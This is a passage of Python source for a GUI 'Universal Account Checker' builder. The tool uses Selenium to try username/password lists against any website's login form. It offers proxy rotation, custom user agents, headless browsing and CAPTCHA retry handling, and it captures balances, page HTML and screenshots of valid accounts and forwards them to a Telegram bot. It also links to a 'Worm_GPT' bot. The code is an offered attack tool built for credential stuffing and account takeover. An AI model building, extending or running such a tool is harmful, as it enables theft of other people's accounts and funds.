    """Force stops the account checking process."""
    if messagebox.askyesno(
        "Force Stop", "Are you sure you want to force stop the process?"
    ):
        stop_event.set()
        pause_event.clear()
        btn_pause_resume.config(text="Pause")
        print_action(
            f"{Fore.RED}Force stop activated. Stopping all operations...{Style.RESET_ALL}"
        )
        close_browser_instance()
        btn_force_stop.config(state=tk.DISABLED)


# -------------------
# Chromedriver Arguments Functions
# -------------------
def add_chromedriver_argument():
    """Adds a new Chromedriver argument."""
    arg = entry_chromedriver_arg.get().strip()
    if arg and not arg.startswith("--"):
        arg = f"--{arg}"
    if arg:
        chromedriver_args_list.append(arg)
        listbox_chromedriver_args.insert(tk.END, arg)
        entry_chromedriver_arg.delete(0, tk.END)
        print_action(
            f"{Fore.GREEN}Added Chromedriver argument: {arg}{Style.RESET_ALL}"
        )
    else:
        messagebox.showerror("Input Error", "Chromedriver argument cannot be empty.")


def remove_chromedriver_argument():
    """Removes the selected Chromedriver argument."""
    selected_indices = listbox_chromedriver_args.curselection()
    if not selected_indices:
        messagebox.showerror(
            "Selection Error", "Please select an argument to remove."
        )
        return
    for index in selected_indices[::-1]:
        arg = listbox_chromedriver_args.get(index)
        try:
            chromedriver_args_list.remove(arg)
            listbox_chromedriver_args.delete(index)
            print_action(
                f"{Fore.GREEN}Removed Chromedriver argument: {arg}{Style.RESET_ALL}"
            )
        except ValueError:
            print_action(
                f"{Fore.RED}Argument {arg} not found in the list.{Style.RESET_ALL}"
            )


# -------------------
# Profile Selection
# -------------------
def select_profile():
    """Opens a window for selecting a Chrome profile."""
    global profile_name

    def choose_profile():
        """Handles profile selection and closes the window."""
        global profile_name
        selected = profile_list.curselection()
        if selected:
            profile_name_selected = profile_list.get(selected[0])
            profile_name = profile_name_selected
            profile_window.destroy()
            print_action(
                f"{Fore.GREEN}Selected Profile: {profile_name}{Style.RESET_ALL}"
            )
        else:
            messagebox.showerror("Selection Error", "Please select a profile.")

    profile_window = tk.Toplevel(window)
    profile_window.title("Select Chrome Profile")
    profile_window.geometry("600x800")

    # Create a custom style for the button
    select_button_style = ttk.Style()
    select_button_style.configure('SelectProfile.TButton', font=("Helvetica", 12, "bold"), padding=10)

    ttk.Label(profile_window, text="Select a Chrome Profile:").pack(
        padx=10, pady=10
    )

    profile_list = tk.Listbox(profile_window, width=50)
    profile_list.pack(padx=10, pady=10, fill="both", expand=True)

    # Add available profiles from the User Data directory
    try:
        profiles = [
            p
            for p in os.listdir(user_data_dir)
            if os.path.isdir(os.path.join(user_data_dir, p)) and p.startswith("Profile ")
        ]
        if not profiles:
            profiles = ["Default"]
    except Exception as e:
        print_action(
            f"{Fore.RED}Error accessing User Data directory: {e}{Style.RESET_ALL}"
        )
        profiles = ["Default"]

    for profile in profiles:
        profile_list.insert(tk.END, profile)

    select_button = ttk.Button(profile_window, text="Select Profile", command=choose_profile, style='SelectProfile.TButton')
    select_button.pack(padx=10, pady=10)
    CreateToolTip(select_button, "Select the highlighted Chrome profile.")

    # Wait for the profile selection window to be closed
    profile_window.grab_set()
    window.wait_window(profile_window)

    # If no profile selected, default to "Default"
    if not profile_name:
        profile_name = "Default"
        print_action(
            f"{Fore.YELLOW}No profile selected. Defaulting to 'Default'.{Style.RESET_ALL}"
        )


# -------------------
# Save and Load Settings Functions (Pickle)
# -------------------
def save_settings():
    """Saves current settings to a file using the pickle module."""
    settings = {}
    # Collect variables
    settings['var_inner_html_capture'] = var_inner_html_capture.get()
    settings['var_outer_html_capture'] = var_outer_html_capture.get()
    settings['var_cleanup_enabled'] = var_cleanup_enabled.get()
    settings['var_telegram_enabled'] = var_telegram_enabled.get()
    settings['capture_telegram_bot_token'] = capture_telegram_bot_token.get()
    settings['capture_telegram_chat_id'] = capture_telegram_chat_id.get()
    settings['var_proxy_enabled'] = var_proxy_enabled.get()
    settings['var_load_extensions'] = var_load_extensions.get()
    settings['var_disable_notifications'] = var_disable_notifications.get()
    settings['var_disable_infobars'] = var_disable_infobars.get()
    settings['var_start_maximized'] = var_start_maximized.get()
    settings['var_disable_extensions_option'] = var_disable_extensions_option.get()
    settings['var_headless'] = var_headless.get()
    settings['var_custom_user_agents'] = var_custom_user_agents.get()
    settings['var_enable_mouse_clicks'] = var_enable_mouse_clicks.get()
    settings['var_incognito_mode'] = var_incognito_mode.get()
    settings['var_invalid_account_enabled'] = var_invalid_account_enabled.get()
    settings['var_captcha_wrong_enabled'] = var_captcha_wrong_enabled.get()
    settings['var_use_database'] = var_use_database.get()
    settings['var_capture_screenshot'] = var_capture_screenshot.get()
    # Entries
    settings['entry_website_target_link'] = entry_website_target_link.get()
    settings['entry_website_valid_link'] = entry_website_valid_link.get()
    settings['entry_redirect_link'] = entry_redirect_link.get()
    settings['entry_css_selector_email'] = entry_css_selector_email.get()
    settings['entry_css_selector_password'] = entry_css_selector_password.get()
    settings['entry_css_selector_submit'] = entry_css_selector_submit.get()
    settings['entry_css_selector_next_button'] = entry_css_selector_next_button.get()
    settings['entry_sleep_email'] = entry_sleep_email.get()
    settings['entry_sleep_password'] = entry_sleep_password.get()
    settings['entry_sleep_submit'] = entry_sleep_submit.get()
    settings['entry_invalid_redirect'] = entry_invalid_redirect.get()
    settings['entry_invalid_error_selector'] = entry_invalid_error_selector.get()
    settings['entry_invalid_inner_html'] = entry_invalid_inner_html.get()
    settings['entry_invalid_outer_html'] = entry_invalid_outer_html.get()
    settings['entry_captcha_redirect'] = entry_captcha_redirect.get()
    settings['entry_captcha_error_selector'] = entry_captcha_error_selector.get()
    settings['entry_captcha_inner_html'] = entry_captcha_inner_html.get()
    settings['entry_captcha_outer_html'] = entry_captcha_outer_html.get()
    # Capture CSS Selectors
    settings['capture_css_selector_frames'] = []
    for frame in capture_css_selector_frames:
        key = frame['key_entry'].get()
        selector = frame['selector_entry'].get()
        settings['capture_css_selector_frames'].append({'key': key, 'selector': selector})
    # Mouse Click Frames
    settings['mouse_click_frames'] = []
    for frame in mouse_click_frames:
        x = frame['x_entry'].get()
        y = frame['y_entry'].get()
        num_clicks = frame['num_clicks_entry'].get()
        interval = frame['interval_entry'].get()
        settings['mouse_click_frames'].append({'x': x, 'y': y, 'num_clicks': num_clicks, 'interval': interval})
    # CSS Click Frames
    settings['css_click_frames'] = []
    for frame in css_click_frames:
        selector = frame['selector_entry'].get()
        num_clicks = frame['num_clicks_entry'].get()
        interval = frame['interval_entry'].get()
        settings['css_click_frames'].append({'selector': selector, 'num_clicks': num_clicks, 'interval': interval})
    # Chromedriver Arguments
    settings['chromedriver_args_list'] = chromedriver_args_list
    # Save to file
    with open(settings_file, 'wb') as f:
        pickle.dump(settings, f)
    print_action(f"{Fore.GREEN}Settings saved to {settings_file}.{Style.RESET_ALL}")


def load_settings():
    """Loads settings from a file using the pickle module."""
    try:
        with open(settings_file, 'rb') as f:
            settings = pickle.load(f)
        # Set variables
        var_inner_html_capture.set(settings.get('var_inner_html_capture', False))
        var_outer_html_capture.set(settings.get('var_outer_html_capture', False))
        var_cleanup_enabled.set(settings.get('var_cleanup_enabled', True))
        var_telegram_enabled.set(settings.get('var_telegram_enabled', False))
        capture_telegram_bot_token.set(settings.get('capture_telegram_bot_token', ''))
        capture_telegram_chat_id.set(settings.get('capture_telegram_chat_id', ''))
        var_proxy_enabled.set(settings.get('var_proxy_enabled', False))
        var_load_extensions.set(settings.get('var_load_extensions', False))
        var_disable_notifications.set(settings.get('var_disable_notifications', False))
        var_disable_infobars.set(settings.get('var_disable_infobars', False))
        var_start_maximized.set(settings.get('var_start_maximized', False))
        var_disable_extensions_option.set(settings.get('var_disable_extensions_option', False))
        var_headless.set(settings.get('var_headless', False))
        var_custom_user_agents.set(settings.get('var_custom_user_agents', False))
        var_enable_mouse_clicks.set(settings.get('var_enable_mouse_clicks', False))
        var_incognito_mode.set(settings.get('var_incognito_mode', False))
        var_invalid_account_enabled.set(settings.get('var_invalid_account_enabled', False))
        var_captcha_wrong_enabled.set(settings.get('var_captcha_wrong_enabled', False))
        var_use_database.set(settings.get('var_use_database', True))
        var_capture_screenshot.set(settings.get('var_capture_screenshot', True))
        # Set entries
        entry_website_target_link.delete(0, tk.END)
        entry_website_target_link.insert(0, settings.get('entry_website_target_link', ''))

        entry_website_valid_link.delete(0, tk.END)
        entry_website_valid_link.insert(0, settings.get('entry_website_valid_link', ''))

        entry_redirect_link.delete(0, tk.END)
        entry_redirect_link.insert(0, settings.get('entry_redirect_link', ''))

        entry_css_selector_email.delete(0, tk.END)
        entry_css_selector_email.insert(0, settings.get('entry_css_selector_email', ''))

        entry_css_selector_password.delete(0, tk.END)
        entry_css_selector_password.insert(0, settings.get('entry_css_selector_password', ''))

        entry_css_selector_submit.delete(0, tk.END)
        entry_css_selector_submit.insert(0, settings.get('entry_css_selector_submit', ''))

        entry_css_selector_next_button.delete(0, tk.END)
        entry_css_selector_next_button.insert(0, settings.get('entry_css_selector_next_button', ''))

        entry_sleep_email.delete(0, tk.END)
        entry_sleep_email.insert(0, settings.get('entry_sleep_email', '25'))

        entry_sleep_password.delete(0, tk.END)
        entry_sleep_password.insert(0, settings.get('entry_sleep_password', '25'))

        entry_sleep_submit.delete(0, tk.END)
        entry_sleep_submit.insert(0, settings.get('entry_sleep_submit', '25'))

        entry_invalid_redirect.delete(0, tk.END)
        entry_invalid_redirect.insert(0, settings.get('entry_invalid_redirect', ''))

        entry_invalid_error_selector.delete(0, tk.END)
        entry_invalid_error_selector.insert(0, settings.get('entry_invalid_error_selector', ''))

        entry_invalid_inner_html.delete(0, tk.END)
        entry_invalid_inner_html.insert(0, settings.get('entry_invalid_inner_html', ''))

        entry_invalid_outer_html.delete(0, tk.END)
        entry_invalid_outer_html.insert(0, settings.get('entry_invalid_outer_html', ''))

        entry_captcha_redirect.delete(0, tk.END)
        entry_captcha_redirect.insert(0, settings.get('entry_captcha_redirect', ''))

        entry_captcha_error_selector.delete(0, tk.END)
        entry_captcha_error_selector.insert(0, settings.get('entry_captcha_error_selector', ''))

        entry_captcha_inner_html.delete(0, tk.END)
        entry_captcha_inner_html.insert(0, settings.get('entry_captcha_inner_html', ''))

        entry_captcha_outer_html.delete(0, tk.END)
        entry_captcha_outer_html.insert(0, settings.get('entry_captcha_outer_html', ''))

        # Load capture CSS selectors
        for frame in capture_css_selector_frames:
            frame['frame'].destroy()
        capture_css_selector_frames.clear()
        for item in settings.get('capture_css_selector_frames', []):
            add_capture_css_selector_frame(key=item['key'], selector=item['selector'], load=True)
        # Load mouse click frames
        for frame in mouse_click_frames:
            frame['frame'].destroy()
        mouse_click_frames.clear()
        for item in settings.get('mouse_click_frames', []):
            add_mouse_click_action_extended()
            frame = mouse_click_frames[-1]
            frame['x_entry'].insert(0, item['x'])
            frame['y_entry'].insert(0, item['y'])
            frame['num_clicks_entry'].insert(0, item['num_clicks'])
            frame['interval_entry'].insert(0, item['interval'])
        # Load CSS click frames
        for frame in css_click_frames:
            frame['frame'].destroy()
        css_click_frames.clear()
        for item in settings.get('css_click_frames', []):
            add_css_click_action()
            frame = css_click_frames[-1]
            frame['selector_entry'].insert(0, item['selector'])
            frame['num_clicks_entry'].insert(0, item['num_clicks'])
            frame['interval_entry'].insert(0, item['interval'])
        # Load chromedriver arguments
        chromedriver_args_list.clear()
        chromedriver_args_list.extend(settings.get('chromedriver_args_list', []))
        listbox_chromedriver_args.delete(0, tk.END)
        for arg in chromedriver_args_list:
            listbox_chromedriver_args.insert(tk.END, arg)
        print_action(f"{Fore.GREEN}Settings loaded from {settings_file}.{Style.RESET_ALL}")
    except FileNotFoundError:
        print_action(f"{Fore.YELLOW}No settings file found. Starting with default settings.{Style.RESET_ALL}")
    except Exception as e:
        print_action(f"{Fore.RED}Error loading settings: {e}{Style.RESET_ALL}")


def on_closing():
    """Handles window closing event."""
    save_settings()
    window.destroy()


# -------------------
# Main GUI Setup
# -------------------
# Initialize the GUI window
window.title(
    "HOFNAR05 - Universal Account Checker | BUILDER | ULTIMATE MODE v8.13 - All modern websites , Capture Balance , create configs , set proxies , and more!"
)
window.geometry("2000x1300")  # Adjusted size for better fit

# Make the window resizable
window.resizable(True, True)

# Styling
style = ttk.Style()
style.theme_use("clam")
style.configure(
    "TButton",
    font=("Helvetica", 10, "bold"),
    padding=(10, 5),
)
style.configure("TLabel", font=("Helvetica", 10))
style.configure("TEntry", font=("Helvetica", 10))
style.configure("TSpinbox", font=("Helvetica", 10))
style.configure("TCheckbutton", font=("Helvetica", 10))
style.configure("TListbox", font=("Helvetica", 10))

# Set background colors for better visual clarity
window.configure(bg="#f0f0f0")  # Light grey background

# Create notebook (tabs)
notebook = ttk.Notebook(window)
notebook.pack(padx=10, pady=10, fill="both", expand=True)

# --- General Settings Tab ---
frame_general = ttk.Frame(notebook)
notebook.add(frame_general, text="REQUIRED: General Settings")

# General Settings Layout
general_settings = [
    ("Website Target Link (Required):", "website_target_link"),
    ("Website Valid Link (Required):", "website_valid_link"),
    ("Redirect URL (Optional):", "redirect_url"),
    (
        "CSS Selector for Email / Username (Required):",
        "css_selector_email",
    ),
    (
        "Sleep Duration (0-100 sec) Seconds it takes to load the Email/Username field:",
        "sleep_email",
    ),
    ("CSS Selector for Password (Required):", "css_selector_password"),
    (
        "Sleep Duration (0-100 sec) Seconds it takes to load the Password field:",
        "sleep_password",
    ),
    (
        "CSS Selector for Submit / Login Button (Required):",
        "css_selector_submit",
    ),
    (
        "Sleep Duration (0-100 sec) Seconds it takes to load the Submit/Button field:",
        "sleep_submit",
    ),
    (
        "CSS Selector for Next Button (Optional):",
        "css_selector_next_button",
    ),
]

for idx, (label_text, var_name) in enumerate(general_settings):
    label = ttk.Label(frame_general, text=label_text)
    label.grid(column=0, row=idx, padx=10, pady=5, sticky="e")

    # Determine if the field is for sleep duration
    if var_name.startswith("sleep_"):
        # Use Entry for sleep duration
        entry = ttk.Entry(frame_general, width=10)
        entry.grid(column=1, row=idx, padx=10, pady=5, sticky="w")
        entry.insert(0, "25")  # Default value

        CreateToolTip(
            entry, f"Set sleep duration for {label_text.rstrip(':')} in seconds."
        )
        globals()[f"entry_{var_name}"] = entry

    else:
        entry = ttk.Entry(frame_general, width=50, foreground="grey")
        entry.grid(column=1, row=idx, padx=10, pady=5, sticky="w")

        if var_name == "redirect_url":
            placeholder_text = "Enter redirect link here..."
        else:
            placeholder_text = "Enter value here..."

        entry.insert(0, placeholder_text)

        # Keep track of placeholder texts
        entry_placeholders.add(placeholder_text)

        # Add placeholder functionality
        def on_focus_in(event, entry=entry, placeholder=placeholder_text):
            if entry.get() == placeholder:
                entry.delete(0, tk.END)
                entry.config(foreground="black")

        def on_focus_out(event, entry=entry, placeholder=placeholder_text):
            if not entry.get():
                entry.insert(0, placeholder)
                entry.config(foreground="grey")

        entry.bind("<FocusIn>", on_focus_in)
        entry.bind("<FocusOut>", on_focus_out)

        # Add tooltip
        tooltip_text = f"Input for {label_text}"

        CreateToolTip(entry, tooltip_text)

        globals()[f"entry_{var_name}"] = entry  # Dynamically create variables

# Display the animated GIF on the right side
try:
    gif_path = os.path.join(os.getcwd(), "animated.gif")
    if os.path.exists(gif_path):
        gif_frame = ttk.Frame(frame_general)
        gif_frame.grid(column=3, row=0, rowspan=len(general_settings), padx=10, pady=5, sticky="n")

        # Load the animated GIF using ImageSequence
        gif_image = Image.open(gif_path)
        frames = [ImageTk.PhotoImage(frame.copy().resize((209, 382))) for frame in ImageSequence.Iterator(gif_image)]

        gif_label = ttk.Label(gif_frame)
        gif_label.pack()

        def animate(index=0):
            frame = frames[index]
            gif_label.config(image=frame)
            index = (index + 1) % len(frames)
            window.after(100, animate, index)

        animate()
        # Add hyperlink below the GIF
        def open_link(event):
            webbrowser.open("https://t.me/hofnar05_Worm_GPT_bot")

        link_label = tk.Label(gif_frame, text="t.me/hofnar05_Worm_GPT_bot", fg="blue", cursor="hand2")
        link_label.pack(pady=5)
        link_label.bind("<Button-1>", open_link)
    else:
        print_action(f"{Fore.RED}animated.gif not found in the current directory.{Style.RESET_ALL}")
except Exception as e:
    print_action(f"{Fore.RED}Error displaying animated GIF: {e}{Style.RESET_ALL}")

# --- Capture Settings Tab ---
frame_capture_settings = ttk.Frame(notebook)
notebook.add(frame_capture_settings, text="REQUIRED: Capture Settings")

# Inner HTML Capture Checkbox
chk_inner_html_capture = ttk.Checkbutton(
    frame_capture_settings,
    text="Enable Inner HTML Capture",
    variable=var_inner_html_capture,
)
chk_inner_html_capture.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_inner_html_capture, "Enable to capture the inner HTML of the page."
)

# Outer HTML Capture Checkbox
chk_outer_html_capture = ttk.Checkbutton(
    frame_capture_settings,
    text="Enable Outer HTML Capture",
    variable=var_outer_html_capture,
)
chk_outer_html_capture.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_outer_html_capture, "Enable to capture the outer HTML of the page."
)

# Capture Screenshot Checkbox (New)
chk_capture_screenshot = ttk.Checkbutton(
    frame_capture_settings,
    text="Capture Screenshot",
    variable=var_capture_screenshot,
)
chk_capture_screenshot.pack(side=tk.RIGHT, padx=10, pady=5, anchor="e")
CreateToolTip(
    chk_capture_screenshot,
    "Enable to capture a screenshot when a valid account is found.",
)

# CSS Selectors for Capture
ttk.Label(frame_capture_settings, text="CSS Selectors to Capture:").pack(
    padx=10, pady=(10, 5), anchor="w"
)

frame_capture_css_selectors = ttk.Frame(frame_capture_settings)
frame_capture_css_selectors.pack(padx=10, pady=5, fill="both", expand=True)

# Add a button to add new CSS selector
ttk.Button(
    frame_capture_settings,
    text="+ Add CSS Selector",
    command=add_capture_css_selector_frame,
).pack(padx=5, pady=5, anchor="w")
CreateToolTip(
    frame_capture_settings.children["!button"], "Add a new CSS selector to capture."
)

# Initialize with one CSS selector frame
add_capture_css_selector_frame()

# Redirect Link Entry
ttk.Label(frame_capture_settings, text="Redirect Link (Optional):").pack(
    padx=10, pady=(10, 5), anchor="w"
)
entry_redirect_link = ttk.Entry(
    frame_capture_settings, width=100, foreground="grey"
)
entry_redirect_link.pack(padx=10, pady=5, anchor="w")
placeholder_redirect_link = "Enter redirect link here..."
entry_redirect_link.insert(0, placeholder_redirect_link)
entry_placeholders.add(placeholder_redirect_link)


def on_focus_in_redirect(event):
    if entry_redirect_link.get() == "Enter redirect link here...":
        entry_redirect_link.delete(0, tk.END)
        entry_redirect_link.config(foreground="black")


def on_focus_out_redirect(event):
    if not entry_redirect_link.get():
        entry_redirect_link.insert(0, "Enter redirect link here...")
        entry_redirect_link.config(foreground="grey")


entry_redirect_link.bind("<FocusIn>", on_focus_in_redirect)
entry_redirect_link.bind("<FocusOut>", on_focus_out_redirect)
CreateToolTip(
    entry_redirect_link,
    "Enter a redirect link to navigate to after a valid account is found.",
)

# Telegram Bot Integration
ttk.Label(frame_capture_settings, text="Telegram Notifications:").pack(
    padx=10, pady=(10, 5), anchor="w"
)

frame_telegram = ttk.Frame(frame_capture_settings)
frame_telegram.pack(padx=10, pady=5, fill="both", expand=True)

chk_telegram_enabled = ttk.Checkbutton(
    frame_telegram,
    text="Enable Telegram Notifications",
    variable=var_telegram_enabled,
)
chk_telegram_enabled.grid(column=0, row=0, padx=5, pady=2, sticky="w")
CreateToolTip(
    chk_telegram_enabled, "Enable to send captured details to a Telegram bot."
)

ttk.Label(frame_telegram, text="Bot Token:").grid(
    column=0, row=1, padx=5, pady=2, sticky="e"
)
entry_telegram_bot_token = ttk.Entry(
    frame_telegram, width=50, textvariable=capture_telegram_bot_token
)
entry_telegram_bot_token.grid(column=1, row=1, padx=5, pady=2, sticky="w")
CreateToolTip(entry_telegram_bot_token, "Enter your Telegram Bot Token. [ This can be obtained from: t.me/BotFather ]")

ttk.Label(frame_telegram, text="Chat ID:").grid(
    column=0, row=2, padx=5, pady=2, sticky="e"
)
entry_telegram_chat_id = ttk.Entry(
    frame_telegram, width=50, textvariable=capture_telegram_chat_id
)
entry_telegram_chat_id.grid(column=1, row=2, padx=5, pady=2, sticky="w")
CreateToolTip(entry_telegram_chat_id, "Enter your Telegram Chat ID. [ This can be obtained from: t.me/getmyid_bot ]")

# --- Invalid Account Implementation Tab ---
frame_invalid_account = ttk.Frame(notebook)
notebook.add(frame_invalid_account, text="REQUIRED: Invalid Account")

chk_invalid_account_enabled = ttk.Checkbutton(
    frame_invalid_account,
    text="Check this and Enable Invalid Account Checks",
    variable=var_invalid_account_enabled,
)
chk_invalid_account_enabled.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_invalid_account_enabled,
    "Enable to implement invalid account validation.",
)

# Invalid Account Settings Layout
invalid_account_settings_list = [
    ("Redirect Detection URL:", "invalid_redirect"),
    ("Error/Alert Detection CSS Selector:", "invalid_error_selector"),
    ("Inner HTML Text:", "invalid_inner_html"),
    ("Outer HTML Text:", "invalid_outer_html"),
]

for idx, (label_text, var_name) in enumerate(invalid_account_settings_list):
    label = ttk.Label(frame_invalid_account, text=label_text)
    label.pack(padx=10, pady=5, anchor="w")

    entry = ttk.Entry(frame_invalid_account, width=100, foreground="grey")
    entry.pack(padx=10, pady=5, anchor="w")

    entry.insert(0, "Enter value here...")
    entry_placeholders.add("Enter value here...")

    def on_focus_in_invalid(event, entry=entry):
        if entry.get() == "Enter value here...":
            entry.delete(0, tk.END)
            entry.config(foreground="black")

    def on_focus_out_invalid(event, entry=entry):
        if not entry.get():
            entry.insert(0, "Enter value here...")
            entry.config(foreground="grey")

    entry.bind("<FocusIn>", lambda e, ent=entry: on_focus_in_invalid(e, ent))
    entry.bind("<FocusOut>", lambda e, ent=entry: on_focus_out_invalid(e, ent))

    tooltip_text = f"Input for {label_text}"
    CreateToolTip(entry, tooltip_text)

    globals()[f"entry_{var_name}"] = entry

# --- CAPTCHA Input Wrong Implementation Tab ---
frame_captcha_wrong = ttk.Frame(notebook)
notebook.add(frame_captcha_wrong, text="OPTIONAL: CAPTCHA Incorrect is Recheck")

chk_captcha_wrong_enabled = ttk.Checkbutton(
    frame_captcha_wrong,
    text="Enable CAPTCHA Incorrect Checks",
    variable=var_captcha_wrong_enabled,
)
chk_captcha_wrong_enabled.pack(padx=10, pady=5, anchor="w")
CreateToolTip(
    chk_captcha_wrong_enabled,
    "Enable to implement CAPTCHA validation and recheck if captcha is incorrect.",
)

# CAPTCHA Wrong Settings Layout
captcha_wrong_settings_list = [
    ("Redirect Detection URL:", "captcha_redirect"),
    ("Error/Alert Detection CSS Selector:", "captcha_error_selector"),
    ("Inner HTML Text:", "captcha_inner_html"),
    ("Outer HTML Text:", "captcha_outer_html"),
]

for idx, (label_text, var_name) in enumerate(captcha_wrong_settings_list):
    label = ttk.Label(frame_captcha_wrong, text=label_text)
    label.pack(padx=10, pady=5, anchor="w")

    entry = ttk.Entry(frame_captcha_wrong, width=100, foreground="grey")
    entry.pack(padx=10, pady=5, anchor="w")

    entry.insert(0, "Enter value here...")
    entry_placeholders.add("Enter value here...")

    def on_focus_in_captcha(event, entry=entry):
        if entry.get() == "Enter value here...":
            entry.delete(0, tk.END)
            entry.config(foreground="black")

    def on_focus_out_captcha(event, entry=entry):
        if not entry.get():
            entry.insert(0, "Enter value here...")
            entry.config(foreground="grey")

    entry.bind("<FocusIn>", lambda e, ent=entry: on_focus_in_captcha(e, ent))
    entry.bind("<FocusOut>", lambda e, ent=entry: on_focus_out_captcha(e, ent))

    tooltip_text = f"Input for {label_text}"
    CreateToolTip(entry, tooltip_text)

    globals()[f"entry_{var_name}"] = entry

# --- Proxy Settings Tab ---
frame_proxy = ttk.Frame(notebook)
notebook.add(frame_proxy, text="OPTIONAL: Proxy Settings")

# Proxy Settings Layout
chk_proxy_enabled = ttk.Checkbutton(
    frame_proxy, text="Enable Proxy", variable=var_proxy_enabled
)
chk_proxy_enabled.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(chk_proxy_enabled, "Enable or disable proxy usage.")

ttk.Label(frame_proxy, text="Proxy Type:").grid(
    column=0, row=1, padx=10, pady=5, sticky="e"
)
proxy_type_var = tk.StringVar(value="HTTP")
proxy_type_dropdown = ttk.OptionMenu(
    frame_proxy, proxy_type_var, "HTTP", "HTTP", "HTTPS", "SOCKS5"
)
proxy_type_dropdown.grid(column=1, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(proxy_type_dropdown, "Select the type of proxy to use.")

ttk.Label(frame_proxy, text="Proxy Mode:").grid(
    column=0, row=2, padx=10, pady=5, sticky="e"
)
proxy_mode_var = tk.StringVar(value="Static Proxies")
proxy_mode_dropdown = ttk.OptionMenu(
    frame_proxy, proxy_mode_var, "Static Proxies", "Static Proxies", "Rotating Proxies"
)
proxy_mode_dropdown.grid(column=1, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(proxy_mode_dropdown, "Choose between static or rotating proxies.")

ttk.Button(
    frame_proxy,
    text="Import Proxies from File",
    command=import_proxies_from_file,
).grid(column=0, row=3, padx=10, pady=10, sticky="w")
CreateToolTip(
    frame_proxy.children["!button"], "Import a list of proxies from a text file."
)

# --- Browser Settings Tab ---
frame_browser = ttk.Frame(notebook)
notebook.add(frame_browser, text="REQUIRED: Browser Settings")

# Browser Settings Layout
chk_cleanup_enabled = ttk.Checkbutton(
    frame_browser,
    text="Clean Browser Data After Each Account Check",
    variable=var_cleanup_enabled,
)
chk_cleanup_enabled.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_cleanup_enabled,
    "Enable to clean browser data after checking each account.",
)

chk_incognito_mode = ttk.Checkbutton(
    frame_browser,
    text="Run Browser in Incognito Mode",
    variable=var_incognito_mode,
)
chk_incognito_mode.grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(chk_incognito_mode, "Enable to run the browser in Incognito mode.")

# --- Advanced Settings Tab ---
frame_advanced = ttk.Frame(notebook)
notebook.add(frame_advanced, text="OPTIONAL: Advanced Settings")

# Advanced Settings Layout
chk_load_extensions = ttk.Checkbutton(
    frame_advanced, text="Load Chrome Extensions", variable=var_load_extensions
)
chk_load_extensions.grid(column=0, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_load_extensions,
    "Enable to load Chrome extensions from the chrome_extensions folder.",
)

chk_disable_notifications = ttk.Checkbutton(
    frame_advanced,
    text="Disable Browser Notifications",
    variable=var_disable_notifications,
)
chk_disable_notifications.grid(column=0, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_notifications, "Disable browser notifications.")

chk_disable_infobars = ttk.Checkbutton(
    frame_advanced, text="Disable Infobars", variable=var_disable_infobars
)
chk_disable_infobars.grid(column=0, row=2, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_infobars, "Disable infobars in the browser.")

chk_start_maximized = ttk.Checkbutton(
    frame_advanced, text="Start Browser Maximized", variable=var_start_maximized
)
chk_start_maximized.grid(column=0, row=3, padx=10, pady=5, sticky="w")
CreateToolTip(chk_start_maximized, "Start the browser in maximized mode.")

chk_disable_extensions_option = ttk.Checkbutton(
    frame_advanced,
    text="Disable Browser Extensions",
    variable=var_disable_extensions_option,
)
chk_disable_extensions_option.grid(column=0, row=4, padx=10, pady=5, sticky="w")
CreateToolTip(chk_disable_extensions_option, "Disable all browser extensions.")

chk_headless = ttk.Checkbutton(
    frame_advanced, text="Run Browser in Headless Mode", variable=var_headless
)
chk_headless.grid(column=0, row=5, padx=10, pady=5, sticky="w")
CreateToolTip(chk_headless, "Run the browser in headless mode (no GUI).")

chk_custom_user_agents = ttk.Checkbutton(
    frame_advanced, text="Use Custom User Agents", variable=var_custom_user_agents
)
chk_custom_user_agents.grid(column=0, row=6, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_custom_user_agents, "Enable to use custom user agents from a file."
)

ttk.Button(
    frame_advanced, text="Select User Agents File", command=select_user_agents_file
).grid(column=0, row=7, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_advanced.children["!button"], "Select a text file containing custom user agents."
)

# Use Databases Checkbox (New)
chk_use_database = ttk.Checkbutton(
    frame_advanced, text="Use Databases", variable=var_use_database
)
chk_use_database.grid(column=0, row=8, padx=10, pady=5, sticky="w")
CreateToolTip(
    chk_use_database,
    "Enable to use databases for tracking checked accounts.",
)

# --- Chromedriver Arguments Tab ---
frame_chromedriver = ttk.Frame(notebook)
notebook.add(frame_chromedriver, text="OPTIONAL: Chromedriver Arguments")

# Chromedriver Arguments Layout
ttk.Label(frame_chromedriver, text="Add Chromedriver Argument:").grid(
    column=0, row=0, padx=10, pady=5, sticky="e"
)
entry_chromedriver_arg = ttk.Entry(frame_chromedriver, width=50, foreground="grey")
entry_chromedriver_arg.grid(column=1, row=0, padx=10, pady=5, sticky="w")
entry_chromedriver_arg.insert(0, "Enter argument here...")


def on_focus_in_chromedriver(event):
    if entry_chromedriver_arg.get() == "Enter argument here...":
        entry_chromedriver_arg.delete(0, tk.END)
        entry_chromedriver_arg.config(foreground="black")


def on_focus_out_chromedriver(event):
    if not entry_chromedriver_arg.get():
        entry_chromedriver_arg.insert(0, "Enter argument here...")
        entry_chromedriver_arg.config(foreground="grey")


entry_chromedriver_arg.bind("<FocusIn>", on_focus_in_chromedriver)
entry_chromedriver_arg.bind("<FocusOut>", on_focus_out_chromedriver)
CreateToolTip(
    entry_chromedriver_arg,
    "Enter a Chromedriver argument to add (e.g., --disable-gpu).",
)

ttk.Button(
    frame_chromedriver, text="Add Argument", command=add_chromedriver_argument
).grid(column=2, row=0, padx=10, pady=5, sticky="w")
CreateToolTip(
    frame_chromedriver.children["!button"], "Add the entered Chromedriver argument."
)

ttk.Label(frame_chromedriver, text="Current Chromedriver Arguments:").grid(
    column=0, row=1, padx=10, pady=5, sticky="nw"
)
listbox_chromedriver_args = tk.Listbox(frame_chromedriver, height=10, width=80)
listbox_chromedriver_args.grid(column=1, row=1, padx=10, pady=5, sticky="w")
CreateToolTip(
